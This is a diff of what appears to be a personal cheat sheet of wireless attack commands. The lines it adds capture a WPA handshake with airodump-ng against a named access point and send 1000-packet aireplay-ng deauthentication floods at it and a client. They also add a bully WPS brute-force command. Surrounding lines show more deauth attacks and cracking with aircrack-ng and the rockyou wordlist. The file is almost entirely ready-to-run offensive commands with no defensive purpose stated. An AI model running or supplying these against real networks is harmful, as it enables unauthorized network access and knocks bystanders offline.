@@ -74,6 +74,16 @@ aireplay-ng  -0 5 a- 84:16:F9:88:56:B8
 aireplay-ng --deauth 1000 -a B0:4E:26:B9:55:6C wlan1mon 
 aireplay-ng --deauth 1000 -a  B0:4E:26:B9:55:6C -c 68:E7:C2:4B:99:7D  wlan1          
 
+================================
+<<<< handshake >>
+
+airodump-ng --bssid -c -w wlan0mon
+airodump-ng --bssid 98:48:27:36:29:88 -c 9 -w /root/handshakes/A.E.O wlan1mon
+aireplay-ng --deauth 1000 -a 98:48:27:36:29:88 wlan1mon 
+aireplay-ng --deauth 1000 -a 98:48:27:36:29:88 -c B0:4E:26:B9:55:6C wlan1mon 
+
+=================================
+
 --------------------------------------
        macchanger
 -------------------------------------
@@ -115,5 +125,12 @@ pyrit -r hs/handshake_EBRALI_64-70-02-46-F6-2E_2020-03-23T20-10-28.cap-0 analyze
 
 =================================
 aircrack-ng -w /root/سطح المكتب/وصلة إلى kali liunx/Downloads/rockyou.txt 2020-02.cap
+=============================================
+
+  bully 
+bully -e 20947010 wlan1mon
+
+=====
+
 
 
